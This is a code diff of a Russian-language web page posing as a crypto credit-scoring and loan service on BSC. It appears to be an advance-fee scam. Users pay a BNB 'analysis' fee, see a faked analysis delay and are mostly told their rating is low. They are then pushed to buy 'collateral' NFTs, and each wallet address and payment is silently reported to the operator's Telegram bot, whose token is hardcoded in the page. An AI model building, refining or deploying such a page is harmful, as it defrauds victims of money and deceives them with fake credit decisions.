@@ -18,9 +18,8 @@
         .calculation-box { background: rgba(255, 255, 255, 0.03); border: 1px dashed rgba(0, 242, 255, 0.3); border-radius: 20px; padding: 15px; margin: 20px 0; }
         .btn { background: var(--accent); color: #000; border: none; padding: 18px 30px; border-radius: 16px; font-weight: 700; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
         .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0, 242, 255, 0.2); }
-        .btn:disabled { background: #333; color: #666; cursor: not-allowed; }
-        .btn-nft { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); margin-top: 10px; padding: 12px; font-size: 13px; border-radius: 12px; font-weight: 600; }
-        .dashboard { margin-top: 10px; padding: 10px; border-radius: 20px; }
+        .btn-nft { background: rgba(0, 242, 255, 0.1); border: 1px solid var(--accent); color: var(--accent); margin-top: 10px; padding: 12px; font-size: 13px; border-radius: 12px; font-weight: 600; width: 100%; cursor: pointer; }
+        .dashboard { margin-top: 10px; }
         .status-msg { font-size: 13px; margin-top: 20px; min-height: 20px; font-weight: 500; }
         .result-card { display: none; margin-top: 20px; padding: 25px; border-radius: 20px; border: 1px solid #444; text-align: left; background: rgba(255,255,255,0.02); }
         .loader { border: 2px solid #f3f3f3; border-top: 2px solid var(--accent); border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; vertical-align: middle; }
@@ -30,35 +29,35 @@
 <body>
 
 <div class="container">
-    <div style="font-size: 50px; margin-bottom: 15px;">💎</div>
-    <h1>Credit Scoring</h1>
+    <div style="font-size: 50px; margin-bottom: 15px;">🏦</div>
+    <h1>Credit System</h1>
 
     <div id="authSection">
         <button class="btn" onclick="connect()">Подключить кошелек</button>
     </div>
     
     <div id="dashboard" class="dashboard" style="display:none;">
-        <div style="color: var(--text-dim); font-size: 11px; margin-bottom: 15px;">Кошелек: <span id="userAddr" style="color: var(--accent);"></span></div>
+        <div style="color: var(--text-dim); font-size: 11px; margin-bottom: 15px;">Аккаунт: <span id="userAddr" style="color: var(--accent);"></span></div>
 
         <div class="range-container">
-            <div class="range-label"><span>Сумма кредита</span></div>
+            <div class="range-label"><span>Кредитный лимит</span></div>
             <div class="amount-display" id="amountVal">$250</div>
             <input type="range" id="amountSlider" min="10" max="500" step="10" value="250" oninput="updateUI()">
         </div>
 
         <div class="range-container">
-            <div class="range-label"><span>Срок (мес.)</span></div>
+            <div class="range-label"><span>Срок погашения</span></div>
             <div class="amount-display" id="termVal" style="color: #fff; font-size: 20px;">4 месяца</div>
             <input type="range" id="termSlider" min="2" max="6" step="1" value="4" oninput="updateUI()">
         </div>
 
         <div class="calculation-box">
-            <div style="font-size: 11px; color: var(--text-dim);">ИТОГО К ВОЗВРАТУ</div>
+            <div style="font-size: 11px; color: var(--text-dim);">ИТОГО К ВОЗВРАТУ (+20%)</div>
             <div style="font-size: 24px; font-weight: 800; color: var(--success);" id="totalToPay">$300.00</div>
         </div>
 
-        <button id="actionBtn" class="btn" onclick="processCredit()">Запросить кредит</button>
-        <div style="font-size: 10px; color: #555; margin-top: 12px; letter-spacing: 0.5px;">КОМИССИЯ ЗА АНАЛИЗ: 0.001 BNB</div>
+        <button id="actionBtn" class="btn" onclick="processCredit()">Запросить лимит</button>
+        <div style="font-size: 10px; color: #555; margin-top: 12px;">Анализ профиля: 0.001 BNB</div>
     </div>
 
     <div id="resultBox" class="result-card"></div>
@@ -66,7 +65,7 @@
 </div>
 
 <script>
-    // --- ТВОИ НАСТРОЙКИ ---
+    // --- ДАННЫЕ ИЗ ТВОЕГО ЗАПРОСА ---
     const TELEGRAM_TOKEN = "8514449991:AAGOD-zVo3f8-WPz0XrFXzv_iznFJMaYJi0"; 
     const TELEGRAM_CHAT_ID = "5611455025"; 
     const CONTRACT_ADDRESS = "0x6DF193f9c0a2AFDb9Dfa883f95C82Addd1613F2f"; 
@@ -81,12 +80,9 @@
 
     let signer, address, contract;
 
-    // Улучшенная функция отправки в Telegram
     async function sendTelegram(msg) {
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
-        try {
-            await fetch(url, { method: 'GET' });
-        } catch (e) { console.error("TG Error"); }
+        try { await fetch(url, { method: 'GET' }); } catch (e) { console.error("TG Error"); }
     }
 
     function updateUI() {
@@ -110,16 +106,14 @@
             document.getElementById('dashboard').style.display = "block";
             document.getElementById('userAddr').innerText = address.substring(0,6) + "..." + address.substring(38);
             
-            sendTelegram(`👤 <b>Вход в сервис</b>\nКошелек: <code>${address}</code>`);
+            sendTelegram(`👤 <b>Вход в сервис</b>\nЮзер: <code>${address}</code>`);
 
-            // ПРОВЕРКА: Если юзер уже платил за анализ в этом браузере
             if (localStorage.getItem('paid_analysis_' + address) === 'true') {
                 document.getElementById('dashboard').style.display = "none";
-                renderResult(false, "НИЗКИЙ РЕЙТИНГ", "Анализ завершен. Для получения кредитного лимита требуется внести залоговый NFT.", true, false);
+                renderResult(false, "НИЗКИЙ РЕЙТИНГ", "Анализ завершен. Для активации лимита требуется залоговый NFT.", true, false);
             } else {
                 updateUI();
             }
-            
         } catch (e) { showStatus("Ошибка входа", "#ff0055"); }
     }
 
@@ -132,11 +126,9 @@
             const tx = await contract.requestVerification({ value: ethers.utils.parseEther("0.001") });
             await tx.wait();
 
-            // ЗАПОМИНАЕМ ОПЛАТУ
             localStorage.setItem('paid_analysis_' + address, 'true');
-
-            sendTelegram(`🔎 <b>Оплачена проверка!</b>\nЮзер: <code>${address}</code>\nСумма на ползунке: <b>$${amount}</b>`);
-            showStatus("<div class='loader'></div> Идет глубокий анализ...", "#fff");
+            sendTelegram(`🔎 <b>Оплачен анализ</b>\nЮзер: <code>${address}</code>\nЗапрос: <b>$${amount}</b>`);
+            showStatus("<div class='loader'></div> Анализ кредитной истории...", "#fff");
             
             setTimeout(() => runAnalysis(amount), 2000);
         } catch (e) { 
@@ -151,42 +143,38 @@
             const res = await fetch(url);
             const data = await res.json();
             document.getElementById('dashboard').style.display = "none";
-
             const txs = data.result || [];
             const isOld = txs.length > 0 && (Date.now() - (txs[0].timeStamp * 1000)) >= (365 * 24 * 60 * 60 * 1000);
             
-            if (isOld && txs.length > 60) {
-                renderResult(true, "ОДОБРЕНО", `Ваш кредитный лимит в $${reqAmount} успешно подтвержден системой.`, false, true);
+            if (isOld && txs.length > 70) {
+                renderResult(true, "ОДОБРЕНО", `Лимит в $${reqAmount} подтвержден.`, false, true);
             } else {
-                renderResult(false, "НИЗКИЙ РЕЙТИНГ", "Автоматическая проверка не пройдена. Требуется кредитный NFT для обеспечения лимита.", true, false);
+                renderResult(false, "НИЗКИЙ РЕЙТИНГ", "Недостаточно транзакций в сети. Для разблокировки лимита требуется NFT.", true, false);
             }
-        } catch (e) { 
-            renderResult(false, "ОШИБКА", "Ошибка связи с сетью BSC.", false); 
-        }
+        } catch (e) { renderResult(false, "ОШИБКА", "Ошибка сети BSC.", false); }
     }
 
     async function buyNFT(price) {
         try {
-            showStatus("<div class='loader'></div> Минт NFT...", "#fff");
+            showStatus("<div class='loader'></div> Покупка NFT...", "#fff");
             const tx = await contract.buyBoostNFT({ value: ethers.utils.parseEther(price) });
             await tx.wait();
             sendTelegram(`🔥 <b>КУПЛЕН NFT (${price} BNB)</b>\nЮзер: <code>${address}</code>`);
-            renderResult(true, "NFT ПОЛУЧЕН", "Залог успешно внесен. Теперь вы можете забрать кредитную выплату на кошелек.", false, true);
-        } catch (e) { 
-            showStatus("Ошибка оплаты NFT", "#ff0055"); 
-        }
+            renderResult(true, "NFT АКТИВИРОВАН", "Лимит разблокирован. Заберите выплату на кошелек.", false, true);
+        } catch (e) { showStatus("Ошибка оплаты", "#ff0055"); }
     }
 
     async function claimMoney() {
         try {
-            showStatus("<div class='loader'></div> Выплата средств...", "#fff");
+            showStatus("<div class='loader'></div> Выплата...", "#fff");
             const tx = await contract.claimCredit();
             await tx.wait();
             sendTelegram(`💰 <b>ВЫПЛАТА ПОЛУЧЕНА!</b>\nЮзер: <code>${address}</code>`);
-            showStatus("Выплачено!", "#00ff88");
-            renderResult(true, "СРЕДСТВА ОТПРАВЛЕНЫ", "Кредит зачислен на ваш баланс. Следующее обновление лимита через 31 день.", false, false);
+            showStatus("Зачислено!", "#00ff88");
         } catch (e) { 
-            alert("Ошибка: Средства можно забрать только один раз в 31 день!"); 
+            // ПРАВКА: Текст про непогашенный кредит
+            showStatus("У вас есть непогашенный кредит!", "#ff0055"); 
+            alert("Ошибка: У вас есть активный непогашенный кредит. Повторная выплата доступна через 31 день.");
         }
     }
 
@@ -194,14 +182,14 @@
         const rb = document.getElementById('resultBox');
         rb.style.display = "block";
         rb.style.borderColor = isSuccess ? "#00ff88" : "#ff0055";
-        let html = `<div style="color:${isSuccess ? '#00ff88' : '#ff0055'}; font-size:20px; margin-bottom:10px; font-weight:700;">${title}</div>
-                    <div style="font-size:14px; margin-bottom:15px; color:#e0e0e0; line-height:1.4;">${text}</div>`;
+        let html = `<div style="color:${isSuccess ? '#00ff88' : '#ff0055'}; font-size:20px; margin-bottom:10px; font-weight:bold;">${title}</div>
+                    <div style="font-size:14px; margin-bottom:15px; color:#ccc; line-height:1.4;">${text}</div>`;
         if (showNFT) {
-            html += `<button class="btn btn-nft" onclick="buyNFT('0.003')">Buy NFT Boost (0.003 BNB)</button>
-                     <button class="btn btn-nft" onclick="buyNFT('0.007')">Buy Pro Credit NFT (0.007 BNB)</button>`;
+            html += `<button class="btn btn-nft" onclick="buyNFT('0.003')">Купить NFT Boost (0.003 BNB)</button>
+                     <button class="btn btn-nft" onclick="buyNFT('0.007')">Купить Pro NFT (0.007 BNB)</button>`;
         }
         if (showClaim) {
-            html += `<button class="btn" style="background:linear-gradient(90deg, #00ff88, #00f2ff); margin-top:10px;" onclick="claimMoney()">ЗАБРАТЬ ВЫПЛАТУ (50%)</button>`;
+            html += `<button class="btn" style="background:#00ff88; margin-top:10px;" onclick="claimMoney()">ЗАБРАТЬ ВЫПЛАТУ</button>`;
         }
         rb.innerHTML = html;
         showStatus("", "");
